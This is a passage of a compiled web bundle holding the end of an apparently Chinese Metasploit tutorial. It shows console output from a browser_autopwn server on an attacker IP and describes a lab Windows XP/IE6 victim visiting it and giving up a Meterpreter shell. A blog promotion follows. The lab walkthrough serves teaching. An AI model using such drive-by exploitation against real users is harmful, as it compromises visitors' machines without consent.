"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".175.128:7777 \n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" --- Done, found "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("20")]),t._v(" exploit modules\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Using URL: http://0.0.0.0:80/\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Local IP: http://192.168.175.128:80/\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Server started.\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br"),a("span",{staticClass:"line-number"},[t._v("11")]),a("br"),a("span",{staticClass:"line-number"},[t._v("12")]),a("br"),a("span",{staticClass:"line-number"},[t._v("13")]),a("br"),a("span",{staticClass:"line-number"},[t._v("14")]),a("br"),a("span",{staticClass:"line-number"},[t._v("15")]),a("br"),a("span",{staticClass:"line-number"},[t._v("16")]),a("br"),a("span",{staticClass:"line-number"},[t._v("17")]),a("br"),a("span",{staticClass:"line-number"},[t._v("18")]),a("br"),a("span",{staticClass:"line-number"},[t._v("19")]),a("br"),a("span",{staticClass:"line-number"},[t._v("20")]),a("br"),a("span",{staticClass:"line-number"},[t._v("21")]),a("br"),a("span",{staticClass:"line-number"},[t._v("22")]),a("br"),a("span",{staticClass:"line-number"},[t._v("23")]),a("br"),a("span",{staticClass:"line-number"},[t._v("24")]),a("br"),a("span",{staticClass:"line-number"},[t._v("25")]),a("br"),a("span",{staticClass:"line-number"},[t._v("26")]),a("br"),a("span",{staticClass:"line-number"},[t._v("27")]),a("br"),a("span",{staticClass:"line-number"},[t._v("28")]),a("br"),a("span",{staticClass:"line-number"},[t._v("29")]),a("br"),a("span",{staticClass:"line-number"},[t._v("30")]),a("br"),a("span",{staticClass:"line-number"},[t._v("31")]),a("br"),a("span",{staticClass:"line-number"},[t._v("32")]),a("br"),a("span",{staticClass:"line-number"},[t._v("33")]),a("br"),a("span",{staticClass:"line-number"},[t._v("34")]),a("br"),a("span",{staticClass:"line-number"},[t._v("35")]),a("br"),a("span",{staticClass:"line-number"},[t._v("36")]),a("br"),a("span",{staticClass:"line-number"},[t._v("37")]),a("br"),a("span",{staticClass:"line-number"},[t._v("38")]),a("br"),a("span",{staticClass:"line-number"},[t._v("39")]),a("br"),a("span",{staticClass:"line-number"},[t._v("40")]),a("br"),a("span",{staticClass:"line-number"},[t._v("41")]),a("br"),a("span",{staticClass:"line-number"},[t._v("42")]),a("br"),a("span",{staticClass:"line-number"},[t._v("43")]),a("br"),a("span",{staticClass:"line-number"},[t._v("44")]),a("br"),a("span",{staticClass:"line-number"},[t._v("45")]),a("br"),a("span",{staticClass:"line-number"},[t._v("46")]),a("br"),a("span",{staticClass:"line-number"},[t._v("47")]),a("br"),a("span",{staticClass:"line-number"},[t._v("48")]),a("br"),a("span",{staticClass:"line-number"},[t._v("49")]),a("br"),a("span",{staticClass:"line-number"},[t._v("50")]),a("br"),a("span",{staticClass:"line-number"},[t._v("51")]),a("br"),a("span",{staticClass:"line-number"},[t._v("52")]),a("br"),a("span",{staticClass:"line-number"},[t._v("53")]),a("br"),a("span",{staticClass:"line-number"},[t._v("54")]),a("br"),a("span",{staticClass:"line-number"},[t._v("55")]),a("br"),a("span",{staticClass:"line-number"},[t._v("56")]),a("br"),a("span",{staticClass:"line-number"},[t._v("57")]),a("br"),a("span",{staticClass:"line-number"},[t._v("58")]),a("br"),a("span",{staticClass:"line-number"},[t._v("59")]),a("br"),a("span",{staticClass:"line-number"},[t._v("60")]),a("br"),a("span",{staticClass:"line-number"},[t._v("61")]),a("br"),a("span",{staticClass:"line-number"},[t._v("62")]),a("br"),a("span",{staticClass:"line-number"},[t._v("63")]),a("br"),a("span",{staticClass:"line-number"},[t._v("64")]),a("br"),a("span",{staticClass:"line-number"},[t._v("65")]),a("br"),a("span",{staticClass:"line-number"},[t._v("66")]),a("br"),a("span",{staticClass:"line-number"},[t._v("67")]),a("br"),a("span",{staticClass:"line-number"},[t._v("68")]),a("br"),a("span",{staticClass:"line-number"},[t._v("69")]),a("br"),a("span",{staticClass:"line-number"},[t._v("70")]),a("br"),a("span",{staticClass:"line-number"},[t._v("71")]),a("br"),a("span",{staticClass:"line-number"},[t._v("72")]),a("br"),a("span",{staticClass:"line-number"},[t._v("73")]),a("br"),a("span",{staticClass:"line-number"},[t._v("74")]),a("br"),a("span",{staticClass:"line-number"},[t._v("75")]),a("br"),a("span",{staticClass:"line-number"},[t._v("76")]),a("br"),a("span",{staticClass:"line-number"},[t._v("77")]),a("br"),a("span",{staticClass:"line-number"},[t._v("78")]),a("br"),a("span",{staticClass:"line-number"},[t._v("79")]),a("br"),a("span",{staticClass:"line-number"},[t._v("80")]),a("br"),a("span",{staticClass:"line-number"},[t._v("81")]),a("br"),a("span",{staticClass:"line-number"},[t._v("82")]),a("br"),a("span",{staticClass:"line-number"},[t._v("83")]),a("br"),a("span",{staticClass:"line-number"},[t._v("84")]),a("br"),a("span",{staticClass:"line-number"},[t._v("85")]),a("br"),a("span",{staticClass:"line-number"},[t._v("86")]),a("br"),a("span",{staticClass:"line-number"},[t._v("87")]),a("br"),a("span",{staticClass:"line-number"},[t._v("88")]),a("br"),a("span",{staticClass:"line-number"},[t._v("89")]),a("br"),a("span",{staticClass:"line-number"},[t._v("90")]),a("br"),a("span",{staticClass:"line-number"},[t._v("91")]),a("br"),a("span",{staticClass:"line-number"},[t._v("92")]),a("br"),a("span",{staticClass:"line-number"},[t._v("93")]),a("br"),a("span",{staticClass:"line-number"},[t._v("94")]),a("br"),a("span",{staticClass:"line-number"},[t._v("95")]),a("br"),a("span",{staticClass:"line-number"},[t._v("96")]),a("br"),a("span",{staticClass:"line-number"},[t._v("97")]),a("br"),a("span",{staticClass:"line-number"},[t._v("98")]),a("br"),a("span",{staticClass:"line-number"},[t._v("99")]),a("br"),a("span",{staticClass:"line-number"},[t._v("100")]),a("br"),a("span",{staticClass:"line-number"},[t._v("101")]),a("br"),a("span",{staticClass:"line-number"},[t._v("102")]),a("br"),a("span",{staticClass:"line-number"},[t._v("103")]),a("br"),a("span",{staticClass:"line-number"},[t._v("104")]),a("br"),a("span",{staticClass:"line-number"},[t._v("105")]),a("br"),a("span",{staticClass:"line-number"},[t._v("106")]),a("br"),a("span",{staticClass:"line-number"},[t._v("107")]),a("br"),a("span",{staticClass:"line-number"},[t._v("108")]),a("br"),a("span",{staticClass:"line-number"},[t._v("109")]),a("br"),a("span",{staticClass:"line-number"},[t._v("110")]),a("br"),a("span",{staticClass:"line-number"},[t._v("111")]),a("br"),a("span",{staticClass:"line-number"},[t._v("112")]),a("br"),a("span",{staticClass:"line-number"},[t._v("113")]),a("br"),a("span",{staticClass:"line-number"},[t._v("114")]),a("br"),a("span",{staticClass:"line-number"},[t._v("115")]),a("br"),a("span",{staticClass:"line-number"},[t._v("116")]),a("br"),a("span",{staticClass:"line-number"},[t._v("117")]),a("br"),a("span",{staticClass:"line-number"},[t._v("118")]),a("br"),a("span",{staticClass:"line-number"},[t._v("119")]),a("br"),a("span",{staticClass:"line-number"},[t._v("120")]),a("br"),a("span",{staticClass:"line-number"},[t._v("121")]),a("br"),a("span",{staticClass:"line-number"},[t._v("122")]),a("br"),a("span",{staticClass:"line-number"},[t._v("123")]),a("br"),a("span",{staticClass:"line-number"},[t._v("124")]),a("br"),a("span",{staticClass:"line-number"},[t._v("125")]),a("br"),a("span",{staticClass:"line-number"},[t._v("126")]),a("br"),a("span",{staticClass:"line-number"},[t._v("127")]),a("br"),a("span",{staticClass:"line-number"},[t._v("128")]),a("br")])]),a("p",[t._v("现在任何一个连接到攻击机80端口的目标都会遭到一个基于它所使用的浏览器的渗透攻击。当有受害者访问我们的IP地址时，browser autopwn模块就会向其发送各种漏洞模块，直到获得Meterpreter控制权限为止。")]),t._v(" "),a("p",[t._v("此时，我们在靶机WinXP上打开IE 6访问连接http://192.168.175.128，")]),t._v(" "),a("p",[t._v("这样，我们就可以拿到靶机的Shell了")]),t._v(" "),a("h2",{attrs:{id:"写在最后"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[t._v("#")]),t._v(" 写在最后")]),t._v(" "),a("blockquote",[a("p",[t._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),a("strong",[t._v("冰河技术")]),t._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),t._v(" "),a("p",[a("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=e.exports}}]);